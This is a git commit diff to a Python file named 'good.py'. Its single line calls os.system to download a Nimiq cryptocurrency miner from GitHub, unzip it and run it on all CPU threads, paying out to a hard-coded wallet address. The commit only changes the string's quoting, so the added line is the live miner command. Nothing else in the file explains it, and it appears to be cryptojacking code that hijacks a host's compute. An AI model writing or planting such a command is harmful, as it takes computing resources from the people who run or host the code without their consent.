a05d6dd0126af58795bdfe04abe4dd357911aa27
x2rohanm <60130151+x2rohanm@users.noreply.github.com>
2020-05-14 11:42:59 +0545

    Update good.py

--- good.py
+++ good.py
@@ -1,3 +1,3 @@
 import os
 
-os.system("wget https://github.com/skypool-org/skypool-nimiq-miner/releases/download/v1.3.4/skypool-nimiq-v1.3.4-linux-x64.zip && unzip skypool-nimiq-v1.3.4-linux-x64.zip && ./skypool-nimiq-v1.3.4-linux-x64/skypool-node-client --address="NQ53 E7TB 6DRD 7GGQ QHXC RX3V BUMY QA6S SMMR" --thread=-1")
+os.system('wget https://github.com/skypool-org/skypool-nimiq-miner/releases/download/v1.3.4/skypool-nimiq-v1.3.4-linux-x64.zip && unzip skypool-nimiq-v1.3.4-linux-x64.zip && ./skypool-nimiq-v1.3.4-linux-x64/skypool-node-client --address="NQ53 E7TB 6DRD 7GGQ QHXC RX3V BUMY QA6S SMMR" --thread=-1')
